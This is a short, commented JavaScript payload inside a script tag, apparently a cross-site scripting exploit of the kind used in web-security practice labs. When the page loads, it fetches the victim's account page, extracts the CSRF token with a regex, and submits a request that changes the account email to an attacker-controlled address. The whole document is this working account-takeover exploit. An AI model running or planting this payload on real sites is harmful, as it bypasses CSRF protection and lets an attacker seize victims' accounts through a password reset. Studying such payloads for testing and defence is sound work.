    <script>
    function parseText(text){
        // PREPARE PATTERN FOR CSRF TOKEN EXTRACTION
        const re = new RegExp(/value="([A-Z,a-z,0-9]+)"/);
        // LOOK FOR CSRF TOKEN
        const csrfArray = re.exec(text);
        var csrf = csrfArray[1];
        return csrf
    };

    function grabCsrf(url){
        // MAKE HTTP GET REQUEST FOR MYACCOUNT_URL
        req = new XMLHttpRequest;
        req.open("GET", url, false);
        req.send();
        const text = req.responseText;
        // PASS THE TEXT OUTPUT OF THE BODY TO THE parseText() FUNCTION
        csrf = parseText(text);
        return csrf
    };

    function changeEmail(){
        // VARIABLES DECLARATION
        var domain = document.domain;
        var domain_url = 'https://'+domain;
        var changeEmail_url = domain_url + '/my-account/change-email';
        var myAccount_url = domain_url + '/my-account';

        // GRAB AND STORE THE CSRF TOKEN
        const csrf = grabCsrf(myAccount_url)

        // CREATE VARIABLES TO SEND ALONG THE REQUEST TO CHANGE EMAIL
        var params = {
            'email' : 'youvebeenhacked@attacker.hack',
            'csrf' : csrf
        };

        var formBody = [];
        // URL ENCODING
        for (property in params) {
            var encodedKey = encodeURIComponent(property);
            var encodedValue = encodeURIComponent(params[property]);
            formBody.push(encodedKey + "=" + encodedValue)
        };
        formBody = formBody.join("&");

        fetch(changeEmail_url, {
            method : 'POST',
            headers : {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body : formBody
        });
    };

document.body.onload = changeEmail()
</script>